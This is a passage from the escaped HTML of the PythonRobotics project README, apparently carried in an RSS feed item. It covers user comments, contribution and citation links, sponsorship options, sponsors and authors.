&lt;p&gt;Your robot's video, which is using PythonRobotics, is very welcome!!&lt;/p&gt; 
&lt;p&gt;This is a list of user's comment and references:&lt;a href="https://github.com/AtsushiSakai/PythonRobotics/raw/master/users_comments.md"&gt;users_comments&lt;/a&gt;&lt;/p&gt; 
&lt;h1&gt;Contribution&lt;/h1&gt; 
&lt;p&gt;Any contribution is welcome!!&lt;/p&gt; 
&lt;p&gt;Please check this document:&lt;a href="https://atsushisakai.github.io/PythonRobotics/modules/0_getting_started/3_how_to_contribute.html"&gt;How To Contribute ‚Äî PythonRobotics documentation&lt;/a&gt;&lt;/p&gt; 
&lt;h1&gt;Citing&lt;/h1&gt; 
&lt;p&gt;If you use this project's code for your academic work, we encourage you to cite &lt;a href="https://arxiv.org/abs/1808.10703"&gt;our papers&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;If you use this project's code in industry, we'd love to hear from you as well; feel free to reach out to the developers directly.&lt;/p&gt; 
&lt;h1&gt;&lt;a id="support"&gt;&lt;/a&gt;Supporting this project&lt;/h1&gt; 
&lt;p&gt;If you or your company would like to support this project, please consider:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;a href="https://github.com/sponsors/AtsushiSakai"&gt;Sponsor @AtsushiSakai on GitHub Sponsors&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;a href="https://www.patreon.com/myenigma"&gt;Become a backer or sponsor on Patreon&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;a href="https://www.paypal.com/paypalme/myenigmapay/"&gt;One-time donation via PayPal&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;If you would like to support us in some other way, please contact with creating an issue.&lt;/p&gt; 
&lt;h2&gt;&lt;a id="sponsors"&gt;&lt;/a&gt;Sponsors&lt;/h2&gt; 
&lt;h3&gt;&lt;a id="JetBrains"&gt;&lt;/a&gt;&lt;a href="https://www.jetbrains.com/"&gt;JetBrains&lt;/a&gt;&lt;/h3&gt; 
&lt;p&gt;They are providing a free license of their IDEs for this OSS development.&lt;/p&gt; 
&lt;h3&gt;&lt;a href="https://github.com/1Password/for-open-source"&gt;1Password&lt;/a&gt;&lt;/h3&gt; 
&lt;p&gt;They are providing a free license of their 1Password team license for this OSS project.&lt;/p&gt; 
&lt;h1&gt;Authors&lt;/h1&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://github.com/AtsushiSakai/PythonRobotics/graphs/contributors"&gt;Contributors to AtsushiSakai/PythonRobotics&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt;</description>
    </item>
    
  </channel>
</rss>